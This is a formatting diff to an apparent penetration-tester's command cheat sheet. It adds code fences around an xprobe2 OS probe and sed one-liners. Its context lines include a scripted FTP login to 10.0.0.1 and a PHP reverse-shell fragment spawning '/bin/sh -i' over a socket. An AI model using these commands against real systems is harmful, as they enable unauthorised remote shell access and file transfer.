@@ -35,8 +35,9 @@ echo open 10.0.0.1 21> ftp.txt & echo USER barry>> ftp.txt & echo Password>> ftp
 ftp -v -n -s:ftp.txt
 ```
 ## Probe for remote OS:
+```
 xprobe2 -v -p tcp:80:open 10.0.0.2
-
+```
 
 ## Windows: Copy all files from a structured directory to an unstructured directory
 ```
@@ -91,11 +92,14 @@ $proc = proc_open("/bin/sh -i", array(0=>$sock, 1=>$sock, 2=>$sock), $pipes);?>
 
 
 ## Add Text to the start of each line in a file:
+```
 sed 's/^/Start/' sourcefile  > destinationfile
+```
 
 ## Add Text to the start of each line in a file:
+```
 sed 's/$/End/' sourcefile  > destinationfile
-
+```
 
 ## Cleanup Weird character in Unix
 Sometimes got an error about unexpected characters when compiling C program, this fixed it. Using an editor like Nano prevents it from reoccuring 
